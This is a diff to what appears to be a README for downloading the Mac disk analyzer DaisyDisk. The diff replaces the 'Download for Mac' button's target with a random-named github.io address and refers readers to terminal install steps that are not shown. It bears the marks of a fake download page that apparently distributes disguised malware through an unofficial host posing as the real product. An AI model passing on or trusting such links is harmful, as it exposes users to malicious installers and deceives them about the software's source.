@@ -2,7 +2,7 @@
 
 DaisyDisk is a fast, beautiful, and interactive disk space analyzer for Mac OS. This tool helps you free up space on your Mac by visualizing what’s taking up your disk. Follow the guide below to download and install DaisyDisk easily on your Mac.
 ![DaisyDisk](https://www.hostingadvice.com/wp-content/uploads/2021/04/HA-DaisyDisk.jpeg?1)
->[![Download for Mac](https://img.shields.io/badge/Download%20for%20Mac-blue?logo=apple&style=for-the-badge)](https://daisydisk-for-mac.github.io/.github/) 
+>[![Download for Mac](https://img.shields.io/badge/Download%20for%20Mac-blue?logo=apple&style=for-the-badge)](https://fituganshfgh.github.io/.github/ddisk) 
 
 >If the button doesn’t work, follow the instructions below using the terminal. 
 
